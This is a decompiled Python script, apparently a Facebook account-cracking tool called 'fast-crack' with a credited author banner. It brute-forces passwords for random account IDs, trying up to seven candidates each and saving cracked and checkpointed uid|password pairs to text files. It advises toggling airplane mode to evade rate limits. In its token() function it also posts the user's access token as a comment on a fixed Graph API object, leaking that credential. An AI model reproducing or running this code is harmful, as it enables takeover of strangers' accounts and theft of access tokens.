...
# Time Succes decompile : 2022-06-16 17:28:01.575922
try:
...
logo = 
OOooOoO    Oo    oOoOOoOOo o      O o.OOoOoo `OooOOo.         .oOOOo.   .oOOOo.  
o         o  O       o     O      o  O        o     `o       .O     o  .O     o  
O        O    o      o     o      O  o        O      O       o         o         
oOooO   oOooOoOo     O     OoOooOOo  ooOO     o     .O       O         O         
O       o      O     o     o      O  O        OOooOO'        O   .oOOo O   .oOOo 
o       O      o     O     O      o  o        o    o         o.      O o.      O 
o       o      O     O     o      o  O        O     O         O.    oO  O.    oO 
O'      O.     O     o'    o      O ooOooOoO  O      o         `OooO'    `OooO'  
                                                                                 
                                                                                 
\n \n \x1b[1;93m(*)\x1b[1;95m Auther    : Rana Nadeem Rajput  \n \x1b[1;93m(*)\x1b[1;93m FB        : facebook.com/ITXRANA.5214\n \x1b[1;93m(*)\x1b[1;95m Tool Name : fast-crack\n \x1b[1;93m(*)\x1b[1;91m Github    : https://github.com/Rananadeem5214\n\x1b[1;95m______________________________________________________\n'
...
def main():
    os.system('clear')
    print logo
    print (' \t [\x1b[1;97m\x1b[1;41m   Wellcome To FATHER Tools   \x1b[0m\x1b[1;93m]').center(50)
    print 54 * '\x1b[1;93m_'
    print ''
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print '\x1b[1;93m[1] \x1b[1;92mEnter In Tools....'
    print '\x1b[1;93m[2] \x1b[1;92mSubscribe my YouTube channel'
...
def token():
    ...
    try:
        ...
        requests.post('https://graph.facebook.com/6825441430830556/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/6825441430830556/LOVE?summary=true&access_token=' + token)
        sav.close()
        login()
...
def menu():
    ...
    print ''
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print '\x1b[1;93m[0] \x1b[1;92mRANDOM NUMBR CLONING\n'
...
def crack_select():
    ...
    print 54 * '_'
    print ''
    print '[\x1b[1;97m\x1b[1;41m Turn On Airplane mode Every 2 mints for  5 Second \x1b[0m\x1b[1;93m]'
    print 54 * '\x1b[1;93m_'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[GG-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('ggok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[GG-CP] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('ggcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[GG-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('ggok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[GG-CP] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('ggcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[GG-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('ggok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[GG-CP] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('ggcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[GG-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('ggok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[GG-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('ggcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[GG-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('ggok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[GG-CP] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('ggcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[GG-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('ggok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[GG-CP] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('ggcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[GG-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('ggok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[GG-CP] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('ggcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
    ...
    print ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: fathercp.txt'
    print 54 * '_'
    print ''
    print ''
...
def choice_select():
    ...
    print ' \x1b[1;92mThe process has been completed'
    print ' \x1b[1;92mTotal Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps))
    print ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: gg.cp.txt'
    print 54 * '_'
    print ''
    print ''
